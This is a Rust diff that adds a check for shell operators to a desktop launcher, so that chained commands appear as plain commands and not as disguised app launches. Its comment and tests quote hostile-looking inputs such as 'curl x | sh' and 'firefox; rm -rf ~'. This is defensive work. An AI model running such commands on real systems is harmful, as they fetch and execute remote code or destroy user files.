@@ -12,6 +12,36 @@ pub fn shell_quote(value: &str) -> String {
     format!("'{}'", value.replace('\'', "'\\''"))
 }
 
+/// Whether the command line does more than run one program: a control
+/// operator, pipe, redirection, substitution or a second line outside
+/// quotes. Such a line is shown as a plain command, never as the app its
+/// first word names.
+pub fn has_shell_operators(input: &str) -> bool {
+    let mut chars = input.chars().peekable();
+    let mut quote: Option<char> = None;
+    while let Some(c) = chars.next() {
+        match quote {
+            Some(q) => {
+                if c == '\\' && q == '"' {
+                    chars.next();
+                } else if c == q {
+                    quote = None;
+                }
+            }
+            None => match c {
+                '\\' => {
+                    chars.next();
+                }
+                '\'' | '"' => quote = Some(c),
+                ';' | '|' | '&' | '>' | '<' | '`' | '\n' => return true,
+                '$' if chars.peek() == Some(&'(') => return true,
+                _ => {}
+            },
+        }
+    }
+    false
+}
+
 /// Splits a POSIX shell command line into words, honouring single quotes,
 /// double quotes, and backslash escapes. Unterminated quotes run to the end.
 pub fn shell_split(input: &str) -> Vec<String> {
@@ -867,6 +897,11 @@ impl Action {
         if let Some(id) = crate::system::flows::run_command_id(command) {
             return Action::Flow(id);
         }
+        // `firefox && curl x | sh` must not be summarised as "Open Firefox"
+        // with Firefox's icon: anything with shell operators is a command.
+        if has_shell_operators(command) {
+            return Action::Command(command.to_string());
+        }
         if let Some(entry) = omarchy_entry_for_command(command.trim()) {
             return Action::Omarchy(entry);
         }
@@ -943,6 +978,20 @@ pub fn webapp_name(url: &str) -> String {
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn shell_operators_make_a_plain_command() {
+        use super::has_shell_operators;
+        assert!(has_shell_operators("uwsm-app -- firefox && curl x | sh"));
+        assert!(has_shell_operators("firefox; rm -rf ~"));
+        assert!(has_shell_operators("echo $(id)"));
+        assert!(has_shell_operators("sleep 5 &"));
+        assert!(!has_shell_operators("uwsm-app -- firefox"));
+        assert!(!has_shell_operators("notify-send 'a & b' \"c | d\""));
+        assert!(!has_shell_operators(
+            "omarchy-launch-webapp https://x.y/?a=1\\&b=2"
+        ));
+    }
+
     use super::*;
 
     #[test]
